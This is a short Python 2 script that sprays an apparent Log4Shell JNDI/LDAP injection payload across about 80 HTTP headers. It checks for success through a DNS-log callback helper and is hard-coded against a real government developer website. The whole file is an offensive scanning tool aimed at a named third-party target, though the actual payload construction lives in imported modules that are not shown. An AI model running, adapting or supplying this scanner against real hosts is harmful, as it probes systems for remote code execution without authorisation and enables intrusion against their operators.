from lib.dnsCheck import Dnslog
from lib.urlClass import urlClass

checkHeaders = [u'Accept-Charset', u'Accept-Datetime', u'Accept-Encoding', u'Accept-Language', u'Authorization', u'Cache-Control', u'Cf-Connecting_ip', u'Client-Ip', u'Contact', u'Cookie', u'DNT', u'Forwarded', u'Forwarded-For', u'Forwarded-For-Ip', u'Forwarded-Proto', u'From', u'If-Modified-Since', u'Max-Forwards', u'Origin', u'Originating-Ip', u'Pragma', u'Referer', u'TE', u'True-Client-IP', u'True-Client-Ip', u'Upgrade', u'User-Agent', u'Via', u'Warning', u'X-ATT-DeviceId', u'X-Api-Version', u'X-Att-Deviceid', u'X-CSRFToken', u'X-Client-Ip', u'X-Correlation-ID', u'X-Csrf-Token', u'X-Do-Not-Track', u'X-Foo', u'X-Foo-Bar', u'X-Forward-For', u'X-Forward-Proto', u'X-Forwarded', u'X-Forwarded-By', u'X-Forwarded-For', u'X-Forwarded-For-Original', u'X-Forwarded-Host', u'X-Forwarded-Port', u'X-Forwarded-Proto', u'X-Forwarded-Protocol', u'X-Forwarded-Scheme', u'X-Forwarded-Server', u'X-Forwarded-Ssl', u'X-Forwarder-For', u'X-Frame-Options', u'X-From', u'X-Geoip-Country', u'X-HTTP-Method-Override', u'X-Http-Destinationurl', u'X-Http-Host-Override', u'X-Http-Method', u'X-Http-Method-Override', u'X-Http-Path-Override', u'X-Https', u'X-Htx-Agent', u'X-Hub-Signature', u'X-If-Unmodified-Since', u'X-Imbo-Test-Config', u'X-Insight', u'X-Ip', u'X-Ip-Trail', u'X-Leakix', u'X-Originating-Ip', u'X-ProxyUser-Ip', u'X-Real-Ip', u'X-Remote-Addr', u'X-Remote-Ip', u'X-Request-ID', u'X-Requested-With', u'X-UIDH', u'X-Wap-Profile', u'X-XSRF-TOKEN']
url = urlClass('', 'https://developer.zjjcy.gov.cn/', [], [])

payloads = [{u'protocol_suf': u'', u'jndi_suf': u'', u'jndi_pre': u'', u'protocol': u'ldap', u'protocol_pre': u''}]

for payload in payloads:
    dns = Dnslog()

    headers_demo = {}
    result = dns.check(url, headers_demo, payload, checkHeaders)

    print result